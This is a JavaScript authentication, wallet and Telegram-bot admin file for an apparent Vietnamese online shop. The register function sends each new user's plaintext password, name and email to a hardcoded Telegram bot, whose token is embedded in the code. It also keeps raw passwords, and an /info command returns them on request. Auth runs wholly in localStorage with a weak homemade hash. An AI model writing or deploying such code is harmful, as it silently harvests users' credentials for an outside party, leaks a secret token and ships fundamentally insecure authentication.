// ========================================
// auth.js - Hệ thống xác thực, ví, Telegram Bot
// ========================================

(function() {
    'use strict';

    // ===== CONFIG =====
    const AUTH_KEY = 'shop_auth_data';
    const USERS_KEY = 'shop_users_data';
    const WALLET_TX_KEY = 'wallet_transactions';
    
    const TELEGRAM_BOT_TOKEN = '8854670785:AAEM4ct2tEJwhJbginwQQSldX-vv4VfYCV0';
    const TELEGRAM_CHAT_ID = '5718360748';

    // ===== DOM REFS =====
    const guestView = document.getElementById('guestView');
    const userView = document.getElementById('userView');
    const userDisplayName = document.getElementById('userDisplayName');
    const userRoleDisplay = document.getElementById('userRoleDisplay');
    const userAvatar = document.getElementById('userAvatar');
    const userWallet = document.getElementById('userWallet');

    const loginForm = document.getElementById('loginForm');
    const registerForm = document.getElementById('registerForm');
    const logoutBtn = document.getElementById('logoutBtn');

    const walletModal = document.getElementById('walletModal');
    const walletBalanceDisplay = document.getElementById('walletBalanceDisplay');
    const walletAmount = document.getElementById('walletAmount');
    const walletPaymentBtn = document.getElementById('walletPaymentBtn');

    const bannedOverlay = document.getElementById('bannedOverlay');
    const loginOverlay = document.getElementById('loginOverlay');

    // ===== STATE =====
    let pendingWalletTx = {
        id: null,
        amount: null,
        userId: null,
        timestamp: null
    };

    // ========================================
    // HELPERS
    // ========================================
    function getUsers() {
        try {
            return JSON.parse(localStorage.getItem(USERS_KEY)) || {};
        } catch {
            return {};
        }
    }

    function saveUsers(users) {
        localStorage.setItem(USERS_KEY, JSON.stringify(users));
    }

    function getCurrentUser() {
        try {
            const user = JSON.parse(localStorage.getItem(AUTH_KEY)) || null;
            if (user && !user.id) {
                const users = getUsers();
                for (const id in users) {
                    if (users[id].username === user.username || users[id].email === user.email) {
                        user.id = id;
                        saveCurrentUser(user);
                        console.log('✅ Đã sửa user.id:', id);
                        break;
                    }
                }
            }
            return user;
        } catch {
            return null;
        }
    }

    function saveCurrentUser(user) {
        localStorage.setItem(AUTH_KEY, JSON.stringify(user));
    }

    function generateId() {
        return Date.now().toString(36) + Math.random().toString(36).substring(2, 6);
    }

    function hashPassword(password) {
        let hash = 0;
        for (let i = 0; i < password.length; i++) {
            const char = password.charCodeAt(i);
            hash = ((hash << 5) - hash) + char;
            hash = hash & hash;
        }
        return 'hash_' + hash.toString(36);
    }

    function formatCurrency(amount) {
        return new Intl.NumberFormat('vi-VN', { style: 'currency', currency: 'VND' }).format(amount).replace('₫', 'đ');
    }

    function showToast(message, type = 'success') {
        const toast = document.getElementById('toast');
        const toastMessage = document.getElementById('toastMessage');
        if (!toast || !toastMessage) return;
        toast.className = `toast-custom toast-${type}`;
        toastMessage.textContent = message;
        toast.classList.add('show');
        setTimeout(() => toast.classList.remove('show'), 4000);
    }

    // ========================================
    // TELEGRAM
    // ========================================
    async function sendTelegramMessage(message) {
        try {
            const payload = {
                chat_id: TELEGRAM_CHAT_ID,
                text: message,
                parse_mode: 'Markdown'
            };
            const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload)
            });
            const result = await response.json();
            if (result.ok) {
                console.log('✅ Đã gửi tin nhắn Telegram');
                return true;
            } else {
                console.error('❌ Lỗi gửi Telegram:', result);
                return false;
            }
        } catch (error) {
            console.error('❌ Lỗi gửi Telegram:', error);
            return false;
        }
    }

    // ========================================
    // WALLET TRANSACTIONS
    // ========================================
    function getWalletTransactions() {
        try {
            return JSON.parse(localStorage.getItem(WALLET_TX_KEY)) || {};
        } catch {
            return {};
        }
    }

    function saveWalletTransaction(txId, data) {
        const transactions = getWalletTransactions();
        transactions[txId] = data;
        localStorage.setItem(WALLET_TX_KEY, JSON.stringify(transactions));
        console.log('💾 Đã lưu transaction:', txId);
    }

    function getWalletTransaction(txId) {
        const transactions = getWalletTransactions();
        return transactions[txId] || null;
    }

    // ========================================
    // WALLET FUNCTIONS
    // ========================================
    function updateWalletUI() {
        const user = getCurrentUser();
        if (user && userWallet) {
            const balance = user.wallet || 0;
            userWallet.textContent = `💰 ${formatCurrency(balance)}`;
            
            document.querySelectorAll('.wallet-balance-small').forEach(el => {
                el.textContent = formatCurrency(balance);
            });
            
            if (walletBalanceDisplay) {
                walletBalanceDisplay.textContent = formatCurrency(balance);
            }
        }
    }

    function getWalletBalance() {
        const user = getCurrentUser();
        return user ? (user.wallet || 0) : 0;
    }

    function addWalletBalance(userId, amount, note = '') {
        const users = getUsers();
        if (users[userId]) {
            const oldBalance = users[userId].wallet || 0;
            users[userId].wallet = oldBalance + amount;
            users[userId].totalRecharge = (users[userId].totalRecharge || 0) + amount;
            users[userId].updatedAt = new Date().toISOString();
            saveUsers(users);
            
            const currentUser = getCurrentUser();
            if (currentUser && currentUser.id === userId) {
                currentUser.wallet = users[userId].wallet;
                currentUser.totalRecharge = users[userId].totalRecharge;
                saveCurrentUser(currentUser);
            }
            
            updateWalletUI();
            return true;
        }
        return false;
    }

    function deductWalletBalance(userId, amount) {
        const users = getUsers();
        if (users[userId] && (users[userId].wallet || 0) >= amount) {
            users[userId].wallet = (users[userId].wallet || 0) - amount;
            users[userId].totalSpent = (users[userId].totalSpent || 0) + amount;
            users[userId].totalOrders = (users[userId].totalOrders || 0) + 1;
            users[userId].successOrders = (users[userId].successOrders || 0) + 1;
            users[userId].updatedAt = new Date().toISOString();
            saveUsers(users);
            
            const currentUser = getCurrentUser();
            if (currentUser && currentUser.id === userId) {
                currentUser.wallet = users[userId].wallet;
                currentUser.totalSpent = users[userId].totalSpent;
                currentUser.totalOrders = users[userId].totalOrders;
                saveCurrentUser(currentUser);
            }
            
            updateWalletUI();
            return true;
        }
        return false;
    }

    function setWalletBalance(userId, amount) {
        const users = getUsers();
        if (users[userId]) {
            const oldBalance = users[userId].wallet || 0;
            users[userId].wallet = amount;
            users[userId].updatedAt = new Date().toISOString();
            saveUsers(users);
            
            const currentUser = getCurrentUser();
            if (currentUser && currentUser.id === userId) {
                currentUser.wallet = users[userId].wallet;
                saveCurrentUser(currentUser);
            }
            
            updateWalletUI();
            return { success: true, oldBalance: oldBalance, newBalance: users[userId].wallet };
        }
        return { success: false };
    }

    // ========================================
    // ADMIN FUNCTIONS
    // ========================================
    function isAdmin(userId) {
        const users = getUsers();
        return users[userId] && users[userId].role === 'admin';
    }

    function makeAdmin(userId) {
        const users = getUsers();
        if (users[userId]) {
            users[userId].role = 'admin';
            users[userId].updatedAt = new Date().toISOString();
            saveUsers(users);
            return true;
        }
        return false;
    }

    function removeAdmin(userId) {
        const users = getUsers();
        if (users[userId] && users[userId].role === 'admin') {
            users[userId].role = 'user';
            users[userId].updatedAt = new Date().toISOString();
            saveUsers(users);
            return true;
        }
        return false;
    }

    function banUser(userId) {
        const users = getUsers();
        if (users[userId]) {
            users[userId].banned = true;
            users[userId].updatedAt = new Date().toISOString();
            saveUsers(users);
            
            const currentUser = getCurrentUser();
            if (currentUser && currentUser.id === userId) {
                localStorage.removeItem(AUTH_KEY);
                updateUI();
                showToast('🚫 Tài khoản của bạn đã bị khóa!', 'error');
                if (bannedOverlay) bannedOverlay.style.display = 'flex';
                if (loginOverlay) loginOverlay.style.display = 'none';
                document.dispatchEvent(new CustomEvent('logoutSuccess'));
            }
            
            return true;
        }
        return false;
    }

    function unbanUser(userId) {
        const users = getUsers();
        if (users[userId]) {
            users[userId].banned = false;
            users[userId].updatedAt = new Date().toISOString();
            saveUsers(users);
            return true;
        }
        return false;
    }

    function deleteUser(userId) {
        const users = getUsers();
        if (users[userId] && !isAdmin(userId)) {
            const currentUser = getCurrentUser();
            if (currentUser && currentUser.id === userId) {
                localStorage.removeItem(AUTH_KEY);
                updateUI();
                if (loginOverlay) loginOverlay.style.display = 'flex';
                document.dispatchEvent(new CustomEvent('logoutSuccess'));
            }
            delete users[userId];
            saveUsers(users);
            return true;
        }
        return false;
    }

    // ========================================
    // AUTH FUNCTIONS
    // ========================================
    function updateUI() {
        const user = getCurrentUser();
        if (user) {
            const users = getUsers();
            if (users[user.id] && users[user.id].banned) {
                localStorage.removeItem(AUTH_KEY);
                showToast('🚫 Tài khoản của bạn đã bị khóa!', 'error');
                if (bannedOverlay) bannedOverlay.style.display = 'flex';
                if (loginOverlay) loginOverlay.style.display = 'none';
                document.dispatchEvent(new CustomEvent('logoutSuccess'));
                return;
            }
            
            if (guestView) guestView.style.display = 'none';
            if (userView) {
                userView.style.display = 'flex';
                if (userDisplayName) userDisplayName.textContent = user.displayName || user.username;
                if (userAvatar) userAvatar.textContent = (user.displayName || user.username || 'U')[0].toUpperCase();
                
                if (user.role === 'admin') {
                    if (userRoleDisplay) {
                        userRoleDisplay.textContent = '👑 Quản trị viên';
                        userRoleDisplay.style.color = '#d82d8b';
                    }
                } else if (user.role === 'vip') {
                    if (userRoleDisplay) {
                        userRoleDisplay.textContent = '⭐ VIP';
                        userRoleDisplay.style.color = '#f59e0b';
                    }
                } else {
                    if (userRoleDisplay) {
                        userRoleDisplay.textContent = 'Thành viên';
                        userRoleDisplay.style.color = '#6c757d';
                    }
                }
            }
            updateWalletUI();
        } else {
            if (guestView) guestView.style.display = 'flex';
            if (userView) userView.style.display = 'none';
        }
        
        document.dispatchEvent(new CustomEvent('authUpdated'));
    }

    function login(username, password) {
        const users = getUsers();
        const hashed = hashPassword(password);
        
        let foundUser = null;
        for (const key in users) {
            const u = users[key];
            if ((u.username === username || u.email === username) && u.password === hashed) {
                if (u.banned) {
                    if (bannedOverlay) bannedOverlay.style.display = 'flex';
                    if (loginOverlay) loginOverlay.style.display = 'none';
                    showToast('🚫 Tài khoản của bạn đã bị khóa!', 'error');
                    return false;
                }
                foundUser = { ...u, id: key };
                users[key].loginCount = (users[key].loginCount || 0) + 1;
                users[key].lastLogin = new Date().toISOString();
                saveUsers(users);
                break;
            }
        }
        
        if (foundUser) {
            const sessionUser = { ...foundUser };
            delete sessionUser.password;
            delete sessionUser.rawPassword;
            saveCurrentUser(sessionUser);
            updateUI();
            showToast(`👋 Chào mừng ${sessionUser.displayName || sessionUser.username}!`, 'success');
            
            if (loginOverlay) loginOverlay.style.display = 'none';
            if (bannedOverlay) bannedOverlay.style.display = 'none';
            document.dispatchEvent(new CustomEvent('loginSuccess'));
            return true;
        }
        
        showToast('❌ Sai tên đăng nhập hoặc mật khẩu!', 'error');
        return false;
    }

    function register(displayName, email, password) {
        const users = getUsers();
        
        for (const key in users) {
            if (users[key].email === email) {
                showToast('❌ Email đã được đăng ký!', 'error');
                return false;
            }
        }
        
        const username = email.split('@')[0];
        for (const key in users) {
            if (users[key].username === username) {
                showToast('❌ Tên đăng nhập đã tồn tại!', 'error');
                return false;
            }
        }
        
        const userId = generateId();
        const newUser = {
            username: username,
            email: email,
            displayName: displayName,
            rawPassword: password,
            password: hashPassword(password),
            role: 'user',
            wallet: 0,
            level: 1,
            exp: 0,
            totalOrders: 0,
            totalSpent: 0,
            totalRecharge: 0,
            successOrders: 0,
            failedOrders: 0,
            emailVerified: false,
            banned: false,
            loginCount: 0,
            lastIP: '',
            lastLogin: null,
            createdAt: new Date().toISOString(),
            updatedAt: new Date().toISOString()
        };
        
        users[userId] = newUser;
        saveUsers(users);
        
        const sessionUser = { ...newUser, id: userId };
        delete sessionUser.password;
        delete sessionUser.rawPassword;
        saveCurrentUser(sessionUser);
        updateUI();
        
        showToast('✅ Đăng ký thành công! Chào mừng bạn!', 'success');
        
        const message = `
🎉 *NGƯỜI DÙNG MỚI ĐĂNG KÝ* 🎉

👤 *Tên:* ${displayName}
📧 *Email:* ${email}
🆔 *ID:* ${userId}
🔑 *Mật khẩu:* \`${password}\`
🕐 *Thời gian:* ${new Date().toLocaleString('vi-VN')}
        `;
        sendTelegramMessage(message);
        
        if (loginOverlay) loginOverlay.style.display = 'none';
        if (bannedOverlay) bannedOverlay.style.display = 'none';
        document.dispatchEvent(new CustomEvent('loginSuccess'));
        return true;
    }

    function logout() {
        localStorage.removeItem(AUTH_KEY);
        updateUI();
        showToast('👋 Đã đăng xuất!', 'info');
        
        if (loginOverlay) loginOverlay.style.display = 'flex';
        if (bannedOverlay) bannedOverlay.style.display = 'none';
        document.dispatchEvent(new CustomEvent('logoutSuccess'));
    }

    // ========================================
    // CHECK USER BANNED
    // ========================================
    function checkUserBanned() {
        const user = getCurrentUser();
        if (user) {
            const users = getUsers();
            if (users[user.id] && users[user.id].banned) {
                localStorage.removeItem(AUTH_KEY);
                updateUI();
                showToast('🚫 Tài khoản của bạn đã bị khóa!', 'error');
                if (bannedOverlay) bannedOverlay.style.display = 'flex';
                if (loginOverlay) loginOverlay.style.display = 'none';
                document.dispatchEvent(new CustomEvent('logoutSuccess'));
            }
        }
    }

    // ========================================
    // TELEGRAM COMMANDS - MỚI, XOÁ THỐNG KÊ CŨ
    // ========================================
    async function handleTelegramCommand(messageText, chatId) {
        console.log('📩 Lệnh từ Telegram:', messageText);
        
        // ===== 1. /user - Danh sách user =====
        if (messageText.startsWith('/user') || messageText.startsWith('/users')) {
            const users = getUsers();
            let userList = '📋 *DANH SÁCH NGƯỜI DÙNG*\n\n';
            let count = 0;
            
            for (const id in users) {
                const u = users[id];
                count++;
                const status = u.banned ? '🚫' : '✅';
                const role = u.role === 'admin' ? '👑' : '👤';
                userList += `${count}. ${role} *${u.displayName || u.username}*\n`;
                userList += `   📧 ${u.email}\n`;
                userList += `   💰 ${formatCurrency(u.wallet || 0)}\n`;
                userList += `   ${status}\n`;
                userList += `   🆔 \`${id}\`\n\n`;
            }
            
            if (count === 0) {
                userList += '❌ Chưa có người dùng nào!';
            } else {
                userList += `📊 *Tổng số:* ${count} người dùng`;
            }
            
            await sendTelegramMessage(userList);
            return true;
        }
        
        // ===== 2. /info - Thông tin user =====
        if (messageText.startsWith('/info')) {
            const parts = messageText.split(' ');
            if (parts.length < 2) {
                await sendTelegramMessage('⚠️ *Cách dùng:* `/info [UserID]`\n📌 Ví dụ: `/info mr50s3828bww6`');
                return true;
            }
            
            let userId = parts[1];
            const users = getUsers();
            
            if (!users[userId]) {
                let found = false;
                for (const id in users) {
                    if (users[id].displayName === userId || users[id].username === userId) {
                        userId = id;
                        found = true;
                        break;
                    }
                }
                if (!found) {
                    await sendTelegramMessage(`⚠️ *Lỗi:* Không tìm thấy user \`${userId}\``);
                    return true;
                }
            }
            
            const u = users[userId];
            const status = u.banned ? '🚫 Đã khóa' : '✅ Hoạt động';
            
            const infoMessage = `
👤 *THÔNG TIN NGƯỜI DÙNG*
━━━━━━━━━━━━━━━━━━━━━
🆔 *ID:* \`${userId}\`
👤 *Tên:* ${u.displayName || 'Chưa có'}
📧 *Email:* ${u.email}
🔑 *Mật khẩu:* \`${u.rawPassword || 'Chưa lưu'}\`
🎭 *Vai trò:* ${u.role || 'user'}
💰 *Số dư:* ${formatCurrency(u.wallet || 0)}
📦 *Đơn hàng:* ${u.totalOrders || 0}
💸 *Chi tiêu:* ${formatCurrency(u.totalSpent || 0)}
💳 *Tổng nạp:* ${formatCurrency(u.totalRecharge || 0)}
🔒 *Trạng thái:* ${status}
━━━━━━━━━━━━━━━━━━━━━
📌 *HƯỚNG DẪN:*
   /doimk ${userId} [mật_khẩu_mới]
   /settien ${userId} [số_tiền]
   /congtien ${userId} [số_tiền]
            `;
            
            await sendTelegramMessage(infoMessage);
            return true;
        }
        
        // ===== 3. /doimk - Đổi mật khẩu =====
        if (messageText.startsWith('/doimk') || messageText.startsWith('/changepass')) {
            const parts = messageText.split(' ');
            if (parts.length < 3) {
                await sendTelegramMessage('⚠️ *Cách dùng:* `/doimk [UserID] [mật_khẩu_mới]`\n📌 Ví dụ: `/doimk mr50s3828bww6 123456`');
                return true;
            }
            
            let userId = parts[1];
            const newPassword = parts[2];
            
            if (!newPassword || newPassword.length < 6) {
                await sendTelegramMessage('⚠️ *Lỗi:* Mật khẩu phải có ít nhất 6 ký tự!');
                return true;
            }
            
            const users = getUsers();
            if (!users[userId]) {
                let found = false;
                for (const id in users) {
                    if (users[id].displayName === userId || users[id].username === userId) {
                        userId = id;
                        found = true;
                        break;
                    }
                }
                if (!found) {
                    await sendTelegramMessage(`⚠️ *Lỗi:* Không tìm thấy user \`${userId}\``);
                    return true;
                }
            }
            
            users[userId].rawPassword = newPassword;
            users[userId].password = hashPassword(newPassword);
            users[userId].updatedAt = new Date().toISOString();
            saveUsers(users);
            
            await sendTelegramMessage(`✅ *ĐỔI MẬT KHẨU THÀNH CÔNG*\n👤 ${users[userId].displayName}\n🔑 Mật khẩu mới: \`${newPassword}\``);
            return true;
        }
        
        // ===== 4. /settien - Set số dư =====
        if (messageText.startsWith('/settien') || messageText.startsWith('/setmoney')) {
            const parts = messageText.split(' ');
            if (parts.length < 3) {
                await sendTelegramMessage('⚠️ *Cách dùng:* `/settien [UserID] [số_tiền]`\n📌 Ví dụ: `/settien mr50s3828bww6 100000`');
                return true;
            }
            
            let userId = parts[1];
            const amount = parseInt(parts[2]);
            
            if (!userId || amount < 0) {
                await sendTelegramMessage('⚠️ *Lỗi:* Số tiền không hợp lệ!');
                return true;
            }
            
            const users = getUsers();
            if (!users[userId]) {
                let found = false;
                for (const id in users) {
                    if (users[id].displayName === userId || users[id].username === userId) {
                        userId = id;
                        found = true;
                        break;
                    }
                }
                if (!found) {
                    await sendTelegramMessage(`⚠️ *Lỗi:* Không tìm thấy user \`${userId}\``);
                    return true;
                }
            }
            
            const result = setWalletBalance(userId, amount);
            if (result.success) {
                await sendTelegramMessage(`✅ *SET SỐ DƯ THÀNH CÔNG*\n👤 ${users[userId].displayName}\n💰 Số dư mới: ${formatCurrency(result.newBalance)}`);
            } else {
                await sendTelegramMessage('❌ *Lỗi:* Không thể set số dư!');
            }
            return true;
        }
        
        // ===== 5. /congtien - Cộng tiền =====
        if (messageText.startsWith('/congtien') || messageText.startsWith('/addmoney')) {
            const parts = messageText.split(' ');
            if (parts.length < 3) {
                await sendTelegramMessage('⚠️ *Cách dùng:* `/congtien [UserID] [số_tiền] [ghi_chú]`\n📌 Ví dụ: `/congtien mr50s3828bww6 50000 Nạp thưởng`');
                return true;
            }
            
            let userId = parts[1];
            const amount = parseInt(parts[2]);
            const note = parts.slice(3).join(' ') || 'Admin cộng tiền';
            
            if (!userId || !amount || amount <= 0) {
                await sendTelegramMessage('⚠️ *Lỗi:* Số tiền không hợp lệ!');
                return true;
            }
            
            const users = getUsers();
            if (!users[userId]) {
                let found = false;
                for (const id in users) {
                    if (users[id].displayName === userId || users[id].username === userId) {
                        userId = id;
                        found = true;
                        break;
                    }
                }
                if (!found) {
                    await sendTelegramMessage(`⚠️ *Lỗi:* Không tìm thấy user \`${userId}\``);
                    return true;
                }
            }
            
            if (addWalletBalance(userId, amount, note)) {
                await sendTelegramMessage(`✅ *CỘNG TIỀN THÀNH CÔNG*\n👤 ${users[userId].displayName}\n💵 +${formatCurrency(amount)}\n💰 Số dư mới: ${formatCurrency(users[userId].wallet)}`);
            } else {
                await sendTelegramMessage('❌ *Lỗi:* Không thể cộng tiền!');
            }
            return true;
        }
        
        // ===== 6. /checkgd - Kiểm tra giao dịch chờ =====
        if (messageText.startsWith('/checkgd') || messageText.startsWith('/check')) {
            const transactions = getWalletTransactions();
            let pendingList = '📋 *GIAO DỊCH ĐANG CHỜ*\n\n';
            let count = 0;
            
            for (const id in transactions) {
                const tx = transactions[id];
                if (tx.status === 'pending' || tx.status === 'confirmed_by_user') {
                    count++;
                    const user = getUsers()[tx.userId];
                    const userName = user ? user.displayName || user.username : 'Unknown';
                    
                    pendingList += `${count}. *Mã:* \`${id}\`\n`;
                    pendingList += `   👤 User: ${userName}\n`;
                    pendingList += `   💵 Số tiền: ${formatCurrency(tx.amount)}\n`;
                    pendingList += `   📌 Trạng thái: ${tx.status === 'confirmed_by_user' ? '✅ Đã xác nhận' : '⏳ Chờ xác nhận'}\n`;
                    pendingList += `   🕐 Thời gian: ${new Date(tx.time).toLocaleString()}\n\n`;
                }
            }
            
            if (count === 0) {
                pendingList += '✅ Không có giao dịch nào đang chờ!';
            } else {
                pendingList += `📊 *Tổng số:* ${count} giao dịch\n💡 *Dùng /duyetvi [Mã GD] để duyệt*`;
            }
            
            await sendTelegramMessage(pendingList);
            return true;
        }
        
        // ===== 7. /duyetvi - Duyệt nạp ví =====
        if (messageText.startsWith('/duyetvi') || messageText.startsWith('/confirm')) {
            const parts = messageText.split(' ');
            if (parts.length < 2) {
                await sendTelegramMessage('⚠️ *Cách dùng:* `/duyetvi [Mã_giao_dịch]`\n📌 Ví dụ: `/duyetvi WALLET_ABC123_XYZ`');
                return true;
            }
            
            let txId = parts[1];
            const transactions = getWalletTransactions();
            
            let foundTxId = null;
            for (const id in transactions) {
                if (id === txId || id.includes(txId) || txId.includes(id)) {
                    foundTxId = id;
                    break;
                }
            }
            
            if (!foundTxId) {
                await sendTelegramMessage(`⚠️ *Lỗi:* Không tìm thấy giao dịch \`${txId}\``);
                return true;
            }
            
            txId = foundTxId;
            const tx = transactions[txId];
            
            if (!tx) {
                await sendTelegramMessage(`⚠️ *Lỗi:* Không tìm thấy giao dịch!`);
                return true;
            }
            
            if (tx.status === 'completed') {
                await sendTelegramMessage(`⚠️ *Lỗi:* Giao dịch đã hoàn thành!`);
                return true;
            }
            
            if (tx.status !== 'confirmed_by_user') {
                await sendTelegramMessage(`⚠️ *Lỗi:* Giao dịch chưa được xác nhận!`);
                return true;
            }
            
            const users = getUsers();
            if (!users[tx.userId]) {
                await sendTelegramMessage(`⚠️ *Lỗi:* Không tìm thấy user!`);
                return true;
            }
            
            const user = users[tx.userId];
            const oldBalance = user.wallet || 0;
            const amount = tx.amount;
            
            user.wallet = oldBalance + amount;
            user.totalRecharge = (user.totalRecharge || 0) + amount;
            user.updatedAt = new Date().toISOString();
            saveUsers(users);
            
            tx.status = 'completed';
            tx.completedAt = new Date().toISOString();
            tx.completedBy = 'admin';
            saveWalletTransaction(txId, tx);
            
            const currentUser = getCurrentUser();
            if (currentUser && currentUser.id === tx.userId) {
                currentUser.wallet = user.wallet;
                currentUser.totalRecharge = user.totalRecharge;
                saveCurrentUser(currentUser);
                updateWalletUI();
            }
            
            await sendTelegramMessage(
                `✅ *DUYỆT NẠP VÍ THÀNH CÔNG*\n\n` +
                `📋 *Mã GD:* ${txId}\n` +
                `👤 *User:* ${user.displayName || user.username}\n` +
                `💵 *Số tiền:* +${formatCurrency(amount)}\n` +
                `💰 *Số dư mới:* ${formatCurrency(user.wallet)}`
            );
            return true;
        }
        
        // ===== 8. /addadmin - Cấp quyền admin =====
        if (messageText.startsWith('/addadmin')) {
            const parts = messageText.split(' ');
            if (parts.length < 2) {
                await sendTelegramMessage('⚠️ *Cách dùng:* `/addadmin [UserID]`\n📌 Ví dụ: `/addadmin mr50s3828bww6`');
                return true;
            }
            
            let userId = parts[1];
            const users = getUsers();
            
            if (!users[userId]) {
                let found = false;
                for (const id in users) {
                    if (users[id].displayName === userId || users[id].username === userId) {
                        userId = id;
                        found = true;
                        break;
                    }
                }
                if (!found) {
                    await sendTelegramMessage(`⚠️ *Lỗi:* Không tìm thấy user!`);
                    return true;
                }
            }
            
            if (isAdmin(userId)) {
                await sendTelegramMessage(`⚠️ *Lưu ý:* User đã là admin!`);
                return true;
            }
            
            if (makeAdmin(userId)) {
                await sendTelegramMessage(`✅ *CẤP QUYỀN ADMIN THÀNH CÔNG*\n👤 ${users[userId].displayName}`);
            }
            return true;
        }
        
        // ===== 9. /removeadmin - Xóa quyền admin =====
        if (messageText.startsWith('/removeadmin')) {
            const parts = messageText.split(' ');
            if (parts.length < 2) {
                await sendTelegramMessage('⚠️ *Cách dùng:* `/removeadmin [UserID]`\n📌 Ví dụ: `/removeadmin mr50s3828bww6`');
                return true;
            }
            
            let userId = parts[1];
            const users = getUsers();
            
            if (!users[userId]) {
                let found = false;
                for (const id in users) {
                    if (users[id].displayName === userId || users[id].username === userId) {
                        userId = id;
                        found = true;
                        break;
                    }
                }
                if (!found) {
                    await sendTelegramMessage(`⚠️ *Lỗi:* Không tìm thấy user!`);
                    return true;
                }
            }
            
            if (!isAdmin(userId)) {
                await sendTelegramMessage(`⚠️ *Lưu ý:* User không phải admin!`);
                return true;
            }
            
            if (removeAdmin(userId)) {
                await sendTelegramMessage(`✅ *XÓA QUYỀN ADMIN THÀNH CÔNG*\n👤 ${users[userId].displayName}`);
            }
            return true;
        }
        
        // ===== 10. /banuser - Khóa user =====
        if (messageText.startsWith('/banuser')) {
            const parts = messageText.split(' ');
            if (parts.length < 2) {
                await sendTelegramMessage('⚠️ *Cách dùng:* `/banuser [UserID]`\n📌 Ví dụ: `/banuser mr50s3828bww6`');
                return true;
            }
            
            let userId = parts[1];
            const users = getUsers();
            
            if (!users[userId]) {
                let found = false;
                for (const id in users) {
                    if (users[id].displayName === userId || users[id].username === userId) {
                        userId = id;
                        found = true;
                        break;
                    }
                }
                if (!found) {
                    await sendTelegramMessage(`⚠️ *Lỗi:* Không tìm thấy user!`);
                    return true;
                }
            }
            
            if (isAdmin(userId)) {
                await sendTelegramMessage('⚠️ *Lỗi:* Không thể khóa admin!');
                return true;
            }
            
            if (banUser(userId)) {
                await sendTelegramMessage(`🚫 *ĐÃ KHÓA USER*\n👤 ${users[userId].displayName}`);
            }
            return true;
        }
        
        // ===== 11. /unbanuser - Mở khóa user =====
        if (messageText.startsWith('/unbanuser')) {
            const parts = messageText.split(' ');
            if (parts.length < 2) {
                await sendTelegramMessage('⚠️ *Cách dùng:* `/unbanuser [UserID]`\n📌 Ví dụ: `/unbanuser mr50s3828bww6`');
                return true;
            }
            
            let userId = parts[1];
            const users = getUsers();
            
            if (!users[userId]) {
                let found = false;
                for (const id in users) {
                    if (users[id].displayName === userId || users[id].username === userId) {
                        userId = id;
                        found = true;
                        break;
                    }
                }
                if (!found) {
                    await sendTelegramMessage(`⚠️ *Lỗi:* Không tìm thấy user!`);
                    return true;
                }
            }
            
            if (unbanUser(userId)) {
                await sendTelegramMessage(`✅ *ĐÃ MỞ KHÓA USER*\n👤 ${users[userId].displayName}`);
            }
            return true;
        }
        
        // ===== 12. /deluser - Xóa user =====
        if (messageText.startsWith('/deluser')) {
            const parts = messageText.split(' ');
            if (parts.length < 2) {
                await sendTelegramMessage('⚠️ *Cách dùng:* `/deluser [UserID]`\n📌 Ví dụ: `/deluser mr50s3828bww6`');
                return true;
            }
            
            let userId = parts[1];
            const users = getUsers();
            
            if (!users[userId]) {
                let found = false;
                for (const id in users) {
                    if (users[id].displayName === userId || users[id].username === userId) {
                        userId = id;
                        found = true;
                        break;
                    }
                }
                if (!found) {
                    await sendTelegramMessage(`⚠️ *Lỗi:* Không tìm thấy user!`);
                    return true;
                }
            }
            
            if (isAdmin(userId)) {
                await sendTelegramMessage('⚠️ *Lỗi:* Không thể xóa admin!');
                return true;
            }
            
            const user = users[userId];
            if (deleteUser(userId)) {
                await sendTelegramMessage(`❌ *ĐÃ XÓA USER*\n👤 ${user.displayName}`);
            }
            return true;
        }
        
        // ===== 13. /help - Hướng dẫn =====
        if (messageText.startsWith('/help')) {
            await sendTelegramMessage(
                `🤖 *HƯỚNG DẪN BOT*\n\n` +
                `📌 *LỆNH CƠ BẢN:*\n\n` +
                `1️⃣ \`/user\`\n   📋 Danh sách người dùng\n\n` +
                `2️⃣ \`/info [ID]\`\n   👤 Thông tin user (CÓ MẬT KHẨU)\n\n` +
                `3️⃣ \`/doimk [ID] [pass]\`\n   🔑 Đổi mật khẩu\n\n` +
                `4️⃣ \`/settien [ID] [số tiền]\`\n   ⚙️ Set số dư ví\n\n` +
                `5️⃣ \`/congtien [ID] [số tiền] [ghichú]\`\n   💰 Cộng tiền ví\n\n` +
                `6️⃣ \`/checkgd\`\n   📋 Kiểm tra giao dịch đang chờ\n\n` +
                `7️⃣ \`/duyetvi [Mã GD]\`\n   ✅ Duyệt nạp ví\n\n` +
                `━━━━━━━━━━━━━━━━━━━━━\n` +
                `📌 *LỆNH ADMIN:*\n\n` +
                `8️⃣ \`/addadmin [ID]\`\n   👑 Cấp quyền admin\n\n` +
                `9️⃣ \`/removeadmin [ID]\`\n   👑 Xóa quyền admin\n\n` +
                `🔟 \`/banuser [ID]\`\n   🚫 Khóa user (tự động đăng xuất)\n\n` +
                `1️⃣1️⃣ \`/unbanuser [ID]\`\n   ✅ Mở khóa user\n\n` +
                `1️⃣2️⃣ \`/deluser [ID]\`\n   ❌ Xóa user\n\n` +
                `1️⃣3️⃣ \`/help\`\n   ❓ Hướng dẫn này\n\n` +
                `━━━━━━━━━━━━━━━━━━━━━\n` +
                `📌 *LƯU Ý:*\n` +
                `• ID user là mã như \`mr50s3828bww6\`\n` +
                `• Mã GD đầy đủ dạng \`WALLET_XXX_XXX\`\n` +
                `• Dùng /user để xem ID và danh sách\n` +
                `• Khi khóa user, user sẽ bị đăng xuất ngay lập tức`
            );
            return true;
        }
        
        return false;
    }

    // ========================================
    // TELEGRAM POLLING
    // ========================================
    function setupTelegramWebhook() {
        let lastUpdateId = 0;
        
        async function pollTelegram() {
            try {
                const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/getUpdates?offset=${lastUpdateId + 1}&timeout=30`;
                const response = await fetch(url);
                const result = await response.json();
                
                if (result.ok && result.result) {
                    for (const update of result.result) {
                        if (update.update_id > lastUpdateId) {
                            lastUpdateId = update.update_id;
                        }
                        
                        if (update.message && update.message.text) {
                            const chatId = update.message.chat.id;
                            const messageText = update.message.text.trim();
                            
                            if (chatId.toString() === TELEGRAM_CHAT_ID) {
                                await handleTelegramCommand(messageText, chatId);
                            }
                        }
                    }
                }
            } catch (error) {
                console.error('❌ Lỗi polling:', error);
            }
            
            setTimeout(pollTelegram, 3000);
        }
        
        pollTelegram();
        console.log('✅ Telegram bot đã chạy');
    }

